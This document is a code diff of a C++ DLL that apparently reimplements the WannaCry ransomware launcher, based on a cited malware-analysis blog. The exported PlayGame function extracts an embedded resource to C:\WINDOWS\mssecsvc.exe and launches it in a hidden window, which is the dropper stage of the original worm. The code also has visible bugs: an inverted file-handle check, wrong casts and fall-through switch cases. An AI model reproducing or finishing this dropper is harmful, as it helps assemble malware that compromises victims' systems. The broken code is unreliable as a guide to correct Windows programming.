@@ -1,4 +1,8 @@
+// dllmain.cpp : Defines the entry point for the DLL application.
+#define _CRT_SECURE_NO_WARNINGS
+
 #include <Windows.h>
+#include <stdio.h>
 
 //assistance from: 
 //https://blog.kartone.ninja/2019/05/23/malware-analysis-a-wannacry-sample-found-in-the-wild/
@@ -9,13 +13,16 @@
 //https://docs.microsoft.com/en-us/windows/win32/procthread/creating-processes
 
 extern "C" VOID __declspec(dllexport) PlayGame();
+int ExtractAndCreate();
+int RunProcess();
 
 //global
 char szDest[MAX_PATH];
+HMODULE hInstDLL;
 
 extern "C" VOID __declspec(dllexport) PlayGame()
 {
-    sprintf(szDest,"C:\\%s\\%s","WINDOWS","mssecsvc.exe");
+    sprintf(szDest, "C:\\%s\\%s", "WINDOWS", "mssecsvc.exe");
     ExtractAndCreate();
     RunProcess();
 }
@@ -28,60 +35,61 @@ int ExtractAndCreate()
     DWORD ResourceSize;
     HGLOBAL hResourceData;
     PVOID pRsrc;
-    hSrc = FindResourceA(hModule, 101, "W");
-    hResourceData = LoadResource(hModule, hSrc);
+    hSrc = FindResourceA(hInstDLL, (LPCSTR)101, "W");
+    hResourceData = LoadResource(hInstDLL, hSrc);
     pRsrc = LockResource(hResourceData);
-    ResourceSize = SizeOfResource(hModule, hSrc);
-    
+    ResourceSize = SizeofResource(hInstDLL, hSrc);
+
     //dwFlagsAndTrributes = 4
     //find out whatever 0x40000000 is
     //UPDATE: GENERIC_WRITE is 0x40000000
-    HANDLE hFile = CreateFileA(szDest, 0x40000000, 2, 0, 2, 4, 0);
-    if(!hFile)
+    hFile = CreateFileA(szDest, 0x40000000, 2, 0, 2, 4, 0);
+    if (!hFile)
     {
         //+4 to skip the DWORD length that's written before the actual resource
-         WriteFile(hFile, pRsrc + 4, ResourceSize, &NumberOfBytestoWrite, NULL);
-         CloseHandle(hFile);
+        WriteFile(hFile, (PVOID*)pRsrc + 4, ResourceSize, &NumberOfBytesToWrite, NULL);
+        CloseHandle(hFile);
     }
+    return 0;
 }
 
 int RunProcess()
 {
-     PROCESS_INFORMATION ProcessInformation;
-     STARTUPINFOA StartupInfo;
-     ProcessInformation.hProcess = oi64;
-     ProcessInformation.hThread = oi64;
-     ProcessInformation.hProcessId = oi64;
-     ProcessInformation.
-     StartupInfo.cb = 104;
-     StartupInfo.wShowWindow = 0;
-     StartupInfo.dwFlags = 129;
-     if(CreateProcess(szDest, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartupInfo, &ProcessInformation)
-     {
-          CloseHandle(ProcessInformation.hThread);
-          CloseHandle(ProcessInformation.hProcess);
-     }
+    PROCESS_INFORMATION ProcessInformation;
+    STARTUPINFOA StartupInfo;
+    ProcessInformation.hProcess = 0;
+    ProcessInformation.hThread = 0;
+    ProcessInformation.dwProcessId = 0;
+    memset(&StartupInfo.lpReserved, 0, sizeof(StartupInfo));
+    StartupInfo.cb = 104;
+    StartupInfo.wShowWindow = 0;
+    StartupInfo.dwFlags = 129;
+    //ZeroMemory(&StartupInfo, sizeof(StartupInfo));
+   // StartupInfo.cb = sizeof(StartupInfo);
+    //ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));
+    if(CreateProcess(NULL, (LPWSTR)szDest, NULL, NULL, FALSE, 0, NULL, NULL, (LPSTARTUPINFOW)&StartupInfo, &ProcessInformation))
+    {
+        CloseHandle(ProcessInformation.hThread);
+        CloseHandle(ProcessInformation.hProcess);
+    }
+    return 0;
 }
 
-BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID)
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
 {
-
-    switch (dwReason)
+    hInstDLL = hModule;
+    switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-    {
         MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "DLL_PROCESS_ATTACH", MB_OK);
-    }
-    break;
-    case DLL_PROCESS_DETACH:
-    {
-        //detach
-    }
-    break;
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
+        MessageBoxA(NULL, "DLL_PROCESS_DETACH", "DLL_PROCESS_DETACH", MB_OK);
+    case DLL_PROCESS_DETACH:
         break;
     }
-
     return TRUE;
 }
